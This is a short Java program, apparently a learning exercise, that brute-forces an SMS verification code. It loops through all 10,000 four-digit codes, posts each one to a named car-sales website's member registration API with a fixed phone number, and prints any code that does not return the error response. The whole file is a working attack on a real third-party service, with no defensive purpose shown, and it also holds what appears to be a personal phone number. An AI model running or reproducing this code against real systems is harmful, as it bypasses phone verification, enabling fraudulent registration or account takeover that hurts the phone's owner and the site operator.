package com.wujun.learning.commom.http;

import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;

public class HttpTest {

    public static void main(String[] args) {
        RestTemplate restTemplate = new RestTemplate();

        for (int a = 0; a < 10000; a++){
            String s = String.valueOf(a);
            if (s.length() == 1){
                s = "000" + s;
            }else if (s.length() == 2){
                s = "00" + s;
            }else if(s.length() == 3){
                s = "0" + s;
            }
            String requestEntity = "{\"data\":{\"userPhone\":\"13166116082\",\"userName\":\"吴\",\"smsCode\":\"" + s
                    + "\",\"cityCode\":\"310000\",\"attachMarketOrigin\":\"sem_pc_baidu_sh0524\",\"attachMarketKeyword\":\"君威\",\"attachUserOrigin\":2,\"attachUserRemark\":\"513c7b80dab5466eabfc1f35ea3acd86\"},\"time\":1501919058512,\"source\":101}";
            ResponseEntity<String> stringResponseEntity = restTemplate.postForEntity("http://www.haomaiche.com/api/user/member/register", requestEntity, String.class);
            if (!stringResponseEntity.getBody().contains("P-1019")){
                System.out.println(s + "===============================================" );
            }
        }



    }

}
